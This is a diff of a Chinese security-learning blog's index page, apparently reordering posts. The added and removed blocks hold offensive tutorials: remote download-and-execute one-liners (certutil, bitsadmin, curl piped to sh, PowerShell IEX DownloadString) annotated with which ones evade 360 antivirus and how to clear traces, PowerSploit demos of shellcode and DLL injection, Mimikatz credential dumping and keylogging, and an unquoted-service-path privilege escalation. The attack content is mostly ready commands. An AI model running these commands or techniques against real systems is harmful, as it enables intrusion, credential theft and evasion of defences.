@@ -261,6 +261,173 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/09/10/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/10/1566846777/" itemprop="url">命令行文件下载的各种姿势</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-10T12:10:57+08:00">
+                2019-09-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/命令行/" itemprop="url" rel="index">
+                    <span itemprop="name">命令行</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="命令行文件下载的各种姿势"><a href="#命令行文件下载的各种姿势" class="headerlink" title="命令行文件下载的各种姿势"></a>命令行文件下载的各种姿势</h1><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><ul>
+<li>​       <a href>bitsadmin /rawreturn /transfer down “http://172.22.35.212/payload1.xml”  C:\1.txt</a> </li>
+<li>​       bitsadmin /transferdown /download /prioritynomal “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a> C:\1.txt  –进度条</li>
+</ul>
+<p>会引发360弹窗。</p>
+<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><ul>
+<li>wget -i <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><ul>
+<li>curl -O <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
+<li>curl <a href="http://192.168.0.107/1.sh" target="_blank" rel="noopener">http://192.168.0.107/1.sh</a> -o- | sh  –sh脚本执行</li>
+</ul>
+<p>360下有弹窗</p>
+<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul>
+<li>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://172.22.35.212/payload1.xml&#39;)&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&#39;)&quot;</a> | out-file payload.xm</li>
+<li>Invoke-WebRequest -Uri  “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a>  -OutFile ‘pay.txt’ -UseBasicParsing</li>
+<li>powershell -w hidden Invoke-WebRequest -uri <a href="http://172.22.35.106/PAYLOAD1.XML" target="_blank" rel="noopener">http://172.22.35.106/PAYLOAD1.XML</a> -OutFile 1025.xml</li>
+<li>(New-Object System.Net.WebClient).downloadfile(“<a href="http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;</a>)</li>
+</ul>
+<p>第四条360无弹窗</p>
+<h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><ul>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> </li>
+<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> delete –清除痕迹</li>
+</ul>
+<p>360下无弹窗<br>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/1.jpg" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -677,208 +844,6 @@ PasswordAuthentication yes
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">PowerSploit基本功能演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
-<li><p>AntivirusBypass     //发现杀软查杀特征</p>
-</li>
-<li><p>CodeExecution      //代码执行</p>
-</li>
-<li><p>Exfiltration     //信息收集</p>
-</li>
-<li><p>Mayhem    //破坏性脚本</p>
-</li>
-<li><p>Persistence    //后门</p>
-</li>
-<li><p>Recon     //利用跳板进行内网信息侦擦</p>
-</li>
-<li><p>ScriptModification     //创建或修改脚本</p>
-<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
-<li><ul>
-<li>Invoke-Shellcode.ps1 **</li>
-</ul>
-<p>shellcode注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-//下载并导入脚本
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
-//下载powershell的shellcode
-Invoke-Shellcode -Shellcode ($buf) -Force
-//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
-Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
-//隐藏的开始一个记事本进程。
-Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
-//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
-<li><ul>
-<li>Invoke-DllInjection.ps1 **</li>
-</ul>
-<p>dll注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-//下载并导入脚本
-Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
-//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
-<li><ul>
-<li>Invoke-Portscan **</li>
-</ul>
-<p>端口扫描</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
-//下载并导入脚本
-Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
-//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
-<li><ul>
-<li>Invoke-Mimikatz.ps1 **</li>
-</ul>
-<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
-<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
- //下载并导入脚本
- Invoke-Mimikatz -DumpCreds
- //抓取密码
-
-** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
-//下载并导入脚本
-Get-Keystrokes -LogPath c:\test.txt
-//开启记录并保存到指定位置</code></pre></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
         
 
@@ -1065,7 +1030,7 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">PowerSploit基本功能演示</a></h1>
         
 
         <div class="post-meta">
@@ -1100,8 +1065,8 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/提权/" itemprop="url" rel="index">
-                    <span itemprop="name">提权</span>
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
                   </a>
                 </span>
 
@@ -1139,16 +1104,67 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
       
         
           
-            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
-<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
-<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
-<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
-<pre><code>C:\Program.exe
-C:\Program Files\ASUSTek.exe
-C:\Program Files\ASUSTek COMPUTER.exe
-C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
-<p>通过重启服务返回了SYSTEM的session</p>
-<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
+            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
+<li><p>AntivirusBypass     //发现杀软查杀特征</p>
+</li>
+<li><p>CodeExecution      //代码执行</p>
+</li>
+<li><p>Exfiltration     //信息收集</p>
+</li>
+<li><p>Mayhem    //破坏性脚本</p>
+</li>
+<li><p>Persistence    //后门</p>
+</li>
+<li><p>Recon     //利用跳板进行内网信息侦擦</p>
+</li>
+<li><p>ScriptModification     //创建或修改脚本</p>
+<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
+<li><ul>
+<li>Invoke-Shellcode.ps1 **</li>
+</ul>
+<p>shellcode注入</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
+//下载并导入脚本
+IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
+//下载powershell的shellcode
+Invoke-Shellcode -Shellcode ($buf) -Force
+//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
+Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
+//隐藏的开始一个记事本进程。
+Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
+//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
+<li><ul>
+<li>Invoke-DllInjection.ps1 **</li>
+</ul>
+<p>dll注入</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
+//下载并导入脚本
+Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
+//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
+<li><ul>
+<li>Invoke-Portscan **</li>
+</ul>
+<p>端口扫描</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
+//下载并导入脚本
+Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
+//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
+<li><ul>
+<li>Invoke-Mimikatz.ps1 **</li>
+</ul>
+<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
+<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
+ //下载并导入脚本
+ Invoke-Mimikatz -DumpCreds
+ //抓取密码
+
+** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
+//下载并导入脚本
+Get-Keystrokes -LogPath c:\test.txt
+//开启记录并保存到指定位置</code></pre></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
 
           
         
@@ -1374,7 +1390,7 @@ sc config &quot;demo&quot; start= auto
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">BadUSB:虚假的恶意USB设备</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
         
 
         <div class="post-meta">
@@ -1409,8 +1425,8 @@ sc config &quot;demo&quot; start= auto
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/命令行/" itemprop="url" rel="index">
-                    <span itemprop="name">命令行</span>
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
                   </a>
                 </span>
 
@@ -1448,32 +1464,16 @@ sc config &quot;demo&quot; start= auto
       
         
           
-            <h1 id="命令行文件下载的各种姿势"><a href="#命令行文件下载的各种姿势" class="headerlink" title="命令行文件下载的各种姿势"></a>命令行文件下载的各种姿势</h1><h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><ul>
-<li>​       <a href>bitsadmin /rawreturn /transfer down “http://172.22.35.212/payload1.xml”  C:\1.txt</a> </li>
-<li>​       bitsadmin /transferdown /download /prioritynomal “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a> C:\1.txt  –进度条</li>
-</ul>
-<p>会引发360弹窗。</p>
-<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><ul>
-<li>wget -i <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
-</ul>
-<p>360下有弹窗</p>
-<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><ul>
-<li>curl -O <a href="http://192.168.0.1/demo.exe" target="_blank" rel="noopener">http://192.168.0.1/demo.exe</a></li>
-<li>curl <a href="http://192.168.0.107/1.sh" target="_blank" rel="noopener">http://192.168.0.107/1.sh</a> -o- | sh  –sh脚本执行</li>
-</ul>
-<p>360下有弹窗</p>
-<h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><ul>
-<li>powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://172.22.35.212/payload1.xml&#39;)&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&#39;)&quot;</a> | out-file payload.xm</li>
-<li>Invoke-WebRequest -Uri  “<a href="http://172.22.35.212/payload1.xml&quot;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;</a>  -OutFile ‘pay.txt’ -UseBasicParsing</li>
-<li>powershell -w hidden Invoke-WebRequest -uri <a href="http://172.22.35.106/PAYLOAD1.XML" target="_blank" rel="noopener">http://172.22.35.106/PAYLOAD1.XML</a> -OutFile 1025.xml</li>
-<li>(New-Object System.Net.WebClient).downloadfile(“<a href="http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml&quot;,&#39;C:\Users\18130\OneDrive\桌面\1.txt&#39;</a>)</li>
-</ul>
-<p>第四条360无弹窗</p>
-<h2 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h2><ul>
-<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> </li>
-<li>certutil -urlcache -split -f <a href="http://172.22.35.212/payload1.xml" target="_blank" rel="noopener">http://172.22.35.212/payload1.xml</a> delete –清除痕迹</li>
-</ul>
-<p>360下无弹窗<br>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/04/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/1.jpg" alt="avatar"></p>
+            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
+<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
+<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
+<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
+<pre><code>C:\Program.exe
+C:\Program Files\ASUSTek.exe
+C:\Program Files\ASUSTek COMPUTER.exe
+C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
+<p>通过重启服务返回了SYSTEM的session</p>
+<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
 
           
         
